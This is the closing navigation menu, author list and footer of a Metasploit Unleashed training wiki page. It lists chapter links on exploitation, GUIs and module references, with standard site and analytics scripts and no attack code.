							<li><a href="Karmetasploit">Karmetasploit</a>
								<ul class="two small">
									<li><a href="Karmetasploit_Configuration">Configuration</a></li>
									<li><a href="Karmetasploit_In_Action">Karmetasploit in Action</a></li>
									<li><a href="Attack_Analysis">Attack Analysis</a></li>
								</ul>
								<div class="clear"></div>
							</li>
							<li><a href="MSF_vs_OS_X">MSF vs OS X</a></li>
							<li><a href="File-Upload_Backdoors">File-Upload Backdoors</a></li>
							<li><a href="Building_A_Module">Building A Module</a>
								<ul class="two small">
									<li><a href="Payloads_Through_MSSQL">Payloads Through MSSQL</a></li>
									<li><a href="Creating_Our_Auxiliary_Module">Creating Our Auxiliary Module</a></li>
									<li><a href="The_Guts_Behind_It">The Guts Behind It</a></li>
								</ul>
								<div class="clear"></div>
							</li>
						</ul>
					</div>
				</li>
				<li>
                                        <a href="Metasploit_GUIs" class="root"><span class="chapter">14</span> Metasploit GUIs</a>
					<div class="menu two-column">
						<h3>Metasploit GUIs</h3>
						<ul class="one">
							<li><a href="MSF_Community_Edition">MSF Community Edition</a>
								<ul class="two small">
                                                                        <li><a href="Scanning">Scanning</a></li>
                                                                        <li><a href="Exploitation">Exploitation</a></li>
                                                                        <li><a href="Post_Exploitation">Post Exploitation</a></li>
                                                                </ul>
								<div class="clear"></div>
                                                        </li>
							<li><a href="Armitage">Armitage</a>
                                                                <ul class="two small">
                                                                        <li><a href="Armitage_Setup">Armitage Setup</a></li>
                                                                        <li><a href="Armitage_Scanning">Armitage Scanning</a></li>
                                                                        <li><a href="Armitage_Exploitation">Armitage Exploitation</a></li>
                                                                	<li><a href="Armitage_Post_Exploitation">Armitage Post Exploitation</a></li>
								</ul>
							</li>
						</ul>
					</div>
				</li>
				<li><a href="About_The_Authors" class="root">About The Authors</a>
					<div class="menu two-column">
						<h3>About the Authors</h3>
						<ul class="one">
							<li><a href="Mati_Aharoni">Mati Aharoni</a></li>
							<li><a href="William_Coppola">William Coppola</a></li>
							<li><a href="Paul_Hand">Paul Hand</a></li>
							<li><a href="Alain_Hernandez">Alain Hernandez</a></li>
							<li><a href="Devon_Kearns">Devon Kearns</a></li>
							<li><a href="David_Kennedy">David Kennedy</a></li>
							<li><a href="Steven_McElrea">Steven McElrea</a></li>
							<li><a href="Matteo_Memelli">Matteo Memelli</a></li>
							<li><a href="http://www.offensive-security.com/metasploit-unleashed/Jim_O'Gorman">Jim O'Gorman</a></li>
							<li><a href="David_Ovitz">David Ovitz</a></li>
							<li><a href="Carlos_Perez">Carlos Perez</a></li>
						</ul>
					</div>
				</li>
                                <li><a href="Post_Module_Reference" class="root">Post Module Reference</a>    
                                        <div class="menu three-column">
                                                <h3>Post Module Reference</h3>
                                                <ul class="one">
                                                        <li>Windows   
                                                                <ul class="two">
                                                                        <li><a href="Windows_Post_Capture_Modules">Capture</a></li>
                                                                        <li><a href="Windows_Post_Gather_Modules">Gather</a></li>
                                                                        <li><a href="Windows_Post_Manage_Modules">Manage</a></li>
                                                                </ul>
                                                                <div class="clear"></div>
                                                        </li>
                                                        <li>Linux
                                                                <ul class="two">
                                                                        <li><a href="Linux_Post_Gather_Modules">Gather</a></li>
                                                                </ul>
								                                <div class="clear"></div>
                                                        </li>
                                                        <li>OS X
                                                                <ul class="two">
                                                                        <li><a href="OS_X_Post_Gather_Modules">Gather</a></li>
                                                                </ul>
					                                			<div class="clear"></div>
                                                        </li>
                                                        <li>Multiple OS
                                                                <ul class="two">
                                                                        <li><a href="Multiple_OS_Post_Gather_Modules">Gather</a></li>
                                                                        <li><a href="Multiple_OS_Post_General_Modules">General</a></li>
                                                                </ul>
							                                	<div class="clear"></div>
                                                        </li>
                                                </ul>
                                        </div>
                                </li>
                                <li><a href="Auxiliary_Module_Reference" class="root">Auxiliary Module Reference</a>    
                                        <div class="menu four-column">
                                                <h3>Auxiliary Module Reference</h3>
                                                <ul class="one">
                                                        <li>Admin   
                                                                <ul class="two">
                                                                        <li><a href="Admin_HTTP_Auxiliary_Modules">HTTP</a></li>
                                                                        <li><a href="Admin_MSSQL_Auxiliary_Modules">MSSQL</a></li>
                                                                        <li><a href="Admin_MySQL_Auxiliary_Modules">MySQL</a></li>
                                                                        <li><a href="Admin_Postgres_Auxiliary_Modules">Postgres</a></li>
                                                                        <li><a href="Admin_VMWare_Auxiliary_Modules">VMWare</a></li>
                                                                </ul>
                                                                <div class="clear"></div>
                                                        </li>
                                                        <li>Scanner
                                                                <ul class="two">
                                                                        <li><a href="Scanner_DCERPC_Auxiliary_Modules">DCERPC</a></li>
                                                                        <li><a href="Scanner_Discovery_Auxiliary_Modules">Discovery</a></li>
                                                                        <li><a href="Scanner_FTP_Auxiliary_Modules">FTP</a></li>
                                                                        <li><a href="Scanner_HTTP_Auxiliary_Modules">HTTP</a></li>
                                                                        <li><a href="Scanner_IMAP_Auxiliary_Modules">IMAP</a></li>
                                                                        <li><a href="Scanner_MSSQL_Auxiliary_Modules">MSSQL</a></li>
                                                                        <li><a href="Scanner_MySQL_Auxiliary_Modules">MySQL</a></li>
                                                                        <li><a href="Scanner_NetBIOS_Auxiliary_Modules">NetBIOS</a></li>
                                                                        <li><a href="Scanner_POP3_Auxiliary_Modules">POP3</a></li>
                                                                        <li><a href="Scanner_SMB_Auxiliary_Modules">SMB</a></li>
                                                                        <li><a href="Scanner_SMTP_Auxiliary_Modules">SMTP</a></li>
                                                                        <li><a href="Scanner_SNMP_Auxiliary_Modules">SNMP</a></li>
                                                                        <li><a href="Scanner_SSH_Auxiliary_Modules">SSH</a></li>
                                                                        <li><a href="Scanner_Telnet_Auxiliary_Modules">Telnet</a></li>
                                                                        <li><a href="Scanner_TFTP_Auxiliary_Modules">TFTP</a></li>
                                                                        <li><a href="Scanner_VMWare_Auxiliary_Modules">VMWare</a></li>
                                                                        <li><a href="Scanner_VNC_Auxiliary_Modules">VNC</a></li>
                                                                </ul>
								                                <div class="clear"></div>
                                                        </li>
                                                        <li>Server
                                                                <ul class="two">
                                                                        <li><a href="Server_Capture_Auxiliary_Modules">Capture</a></li>
                                                                </ul>
					                                			<div class="clear"></div>
                                                        </li>
                                                </ul>
                                        </div>
                                </li>
			<br />
			<br />
			<br />
			<br />
			</ul>
													</div>
				
					<div class="clear"></div>
				</div>

				<div id="footer">
					<div id="footer-content">
						<div class="left">
							Copyright &copy; 2013 Offensive Security Ltd. All rights reserved.
						</div>
						<div class="right">
							<a href="http://www.offensive-security.com/"><img src="http://www.offensive-security.com/w/skins/msfu/offsec.png" alt="Offensive Security" /></a>
						</div>
						<div class="clear"></div>
					</div>
				</div>
			
		</div>
<script>if(window.mw){
mw.loader.state({"site":"loading","user":"missing","user.groups":"ready"});
}</script>
<script>if(window.mw){
mw.loader.load(["mediawiki.user","mediawiki.page.ready","mediawiki.searchSuggest"], null, true);
}</script>
<script src="http://www.offensive-security.com/w/load.php?debug=false&amp;lang=en&amp;modules=site&amp;only=scripts&amp;skin=msfu&amp;*"></script>
<script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src='" + gaJsHost + "google-analytics.com/ga.js' type='text/javascript'%3E%3C/script%3E"));
</script>
<script type="text/javascript">
var pageTracker = _gat._getTracker("UA-1981501-1");
pageTracker._trackPageview();
</script><!-- Served in 0.128 secs. --></body></html>